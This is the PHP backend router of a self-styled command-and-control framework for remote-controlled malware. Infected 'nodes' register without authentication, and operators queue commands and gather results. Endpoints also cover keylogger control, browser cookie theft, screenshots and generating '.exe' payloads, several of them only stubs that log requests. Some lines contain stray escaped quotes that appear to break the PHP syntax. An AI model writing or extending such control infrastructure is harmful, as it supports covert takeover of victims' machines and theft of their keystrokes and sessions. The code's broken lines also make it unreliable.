<?php
/**
 * C2 Framework - PHP Backend API Router
 * Professional Command & Control System
 */

require_once __DIR__ . '/config/config.php';
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/middleware/Auth.php';
require_once __DIR__ . '/utils/JWT.php';
require_once __DIR__ . '/utils/Encryption.php';
require_once __DIR__ . '/models/Node.php';
require_once __DIR__ . '/models/Command.php';
require_once __DIR__ . '/models/AuditLog.php';

header('Content-Type: application/json');

// Get request method and path
$method = $_SERVER['REQUEST_METHOD'];
$request_uri = $_SERVER['REQUEST_URI'];
$path = parse_url($request_uri, PHP_URL_PATH);
$path = str_replace('/api', '', $path);
$path_parts = explode('/', trim($path, '/'));

// Initialize models
$nodeModel = new Node();
$commandModel = new Command();
$auditModel = new AuditLog();

// Router
try {
    // Authentication endpoint
    if ($path_parts[0] === 'auth' && $path_parts[1] === 'login' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        
        $database = new Database();
        $conn = $database->getConnection();
        
        $query = "SELECT * FROM users WHERE username = :username AND is_active = 1";
        $stmt = $conn->prepare($query);
        $stmt->bindParam(':username', $data['username']);
        $stmt->execute();
        $user = $stmt->fetch();
        
        if ($user && Auth::verifyPassword($data['password'], $user['password'])) {
            $payload = [
                'sub' => $user['username'],
                'user_id' => $user['id'],
                'role' => $user['role'],
                'exp' => time() + JWT_EXPIRATION
            ];
            
            $token = JWT::encode($payload, SECRET_KEY);
            
            // Update last login
            $update_query = "UPDATE users SET last_login = NOW() WHERE id = :id";
            $update_stmt = $conn->prepare($update_query);
            $update_stmt->bindParam(':id', $user['id']);
            $update_stmt->execute();
            
            // Log authentication
            $auditModel->log('login', $user['id'], $user['username'], null, 'Admin login successful');
            
            echo json_encode([
                'access_token' => $token,
                'token_type' => 'bearer'
            ]);
        } else {
            http_response_code(401);
            echo json_encode(['error' => 'Invalid credentials']);
        }
        exit();
    }
    
    // Node registration (no auth required)
    if ($path_parts[0] === 'nodes' && $path_parts[1] === 'register' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        $node = $nodeModel->register($data);
        
        if ($node) {
            http_response_code(200);
            echo json_encode($node);
        } else {
            http_response_code(500);
            echo json_encode(['error' => 'Registration failed']);
        }
        exit();
    }
    
    // System info update (no auth, but requires node validation)
    if ($path_parts[0] === 'sysinfo' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        $nodeModel->updateSysInfo($data['node_id'], $data);
        echo json_encode(['message' => 'Info received']);
        exit();
    }
    
    // All other endpoints require authentication
    $user = Auth::verifyToken();
    
    // GET /nodes - List all nodes
    if ($path_parts[0] === 'nodes' && $method === 'GET' && !isset($path_parts[1])) {
        $nodes = $nodeModel->getAll();
        echo json_encode($nodes);
        exit();
    }
    
    // GET /nodes/{id} - Get specific node
    if ($path_parts[0] === 'nodes' && $method === 'GET' && isset($path_parts[1])) {
        $node = $nodeModel->getById($path_parts[1]);
        if ($node) {
            echo json_encode($node);
        } else {
            http_response_code(404);
            echo json_encode(['error' => 'Node not found']);
        }
        exit();
    }
    
    // DELETE /nodes/{id} - Delete node (kill)
    if ($path_parts[0] === 'nodes' && $method === 'DELETE' && isset($path_parts[1])) {
        $node_id = $path_parts[1];
        
        // Log before deletion
        $auditModel->log('node_delete', $user['user_id'], $user['sub'], $node_id, 'Node removed from system');
        
        $nodeModel->delete($node_id);
        echo json_encode(['message' => 'Node deleted successfully']);
        exit();
    }
    
    // POST /commands - Create command
    if ($path_parts[0] === 'commands' && $method === 'POST' && !isset($path_parts[1])) {
        $data = json_decode(file_get_contents('php://input'), true);
        $command = $commandModel->create($data);
        
        if ($command) {
            // Log command execution
            $auditModel->log('command_execute', $user['user_id'], $user['sub'], $data['node_id'], 'Command: ' . $data['command']);
            echo json_encode($command);
        } else {
            http_response_code(500);
            echo json_encode(['error' => 'Command creation failed']);
        }
        exit();
    }
    
    // GET /commands - List commands
    if ($path_parts[0] === 'commands' && $method === 'GET' && !isset($path_parts[1])) {
        $node_id = $_GET['node_id'] ?? null;
        $commands = $commandModel->getAll($node_id);
        echo json_encode($commands);
        exit();
    }
    
    // POST /commands/result - Update command result (from agent)
    if ($path_parts[0] === 'commands' && $path_parts[1] === 'result' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        $commandModel->updateResult($data['command_id'], $data['result'], $data['status']);
        echo json_encode(['message' => 'Result received']);
        exit();
    }
    
    // GET /stats - Dashboard statistics
    if ($path_parts[0] === 'stats' && $method === 'GET') {
        $database = new Database();
        $conn = $database->getConnection();
        $stmt = $conn->query(\"CALL sp_get_dashboard_stats()\");
        $stats = $stmt->fetch();
        echo json_encode($stats);
        exit();
    }
    
    // GET /logs - Audit logs
    if ($path_parts[0] === 'logs' && $method === 'GET') {
        $limit = $_GET['limit'] ?? 100;
        $logs = $auditModel->getRecent($limit);
        echo json_encode($logs);
        exit();
    }
    
    // POST /screenshot - Request screenshot
    if ($path_parts[0] === 'screenshot' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        
        // In real implementation, this would trigger WebSocket message
        // For now, just log the request
        $auditModel->log('screenshot_requested', $user['user_id'], $user['sub'], $data['node_id'], 'Screenshot capture initiated');
        
        echo json_encode(['message' => 'Screenshot requested']);
        exit();
    }
    
    // POST /files/list - List files
    if ($path_parts[0] === 'files' && $path_parts[1] === 'list' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        
        $auditModel->log('file_list', $user['user_id'], $user['sub'], $data['node_id'], 'File list requested');
        
        echo json_encode(['message' => 'File list requested']);
        exit();
    }
    
    // POST /keylogger - Control keylogger
    if ($path_parts[0] === 'keylogger' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        
        $action_details = \"Keylogger action: \" . $data['action'];
        $auditModel->log('keylogger_' . $data['action'], $user['user_id'], $user['sub'], $data['node_id'], $action_details);
        
        echo json_encode(['message' => \"Keylogger {$data['action']} requested\"]);
        exit();
    }
    
    // POST /cookies/steal/{node_id} - Steal cookies
    if ($path_parts[0] === 'cookies' && $path_parts[1] === 'steal' && $method === 'POST') {
        $node_id = $path_parts[2];
        
        $auditModel->log('steal_cookies', $user['user_id'], $user['sub'], $node_id, 'Browser cookies extraction requested');
        
        echo json_encode(['message' => 'Cookie extraction requested']);
        exit();
    }
    
    // POST /builder/generate - Generate payload
    if ($path_parts[0] === 'builder' && $path_parts[1] === 'generate' && $method === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        
        // Log payload generation
        $auditModel->log('payload_generated', $user['user_id'], $user['sub'], null, 'Payload generation requested');
        
        $timestamp = date('Ymd_His');
        $filename = \"payload_{$timestamp}.exe\";
        
        // In real implementation, would trigger build process
        echo json_encode([
            'message' => 'Payload generation initiated',
            'filename' => $filename,
            'path' => PAYLOADS_DIR . '/' . $filename
        ]);
        exit();
    }
    
    // Root endpoint
    if ($path_parts[0] === '' && $method === 'GET') {
        echo json_encode([
            'message' => 'C2 Framework API',
            'status' => 'operational',
            'version' => '2.0.0',
            'backend' => 'PHP/MySQL'
        ]);
        exit();
    }
    
    // 404 Not Found
    http_response_code(404);
    echo json_encode(['error' => 'Endpoint not found']);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'error' => 'Internal server error',
        'message' => $e->getMessage()
    ]);
}
?>
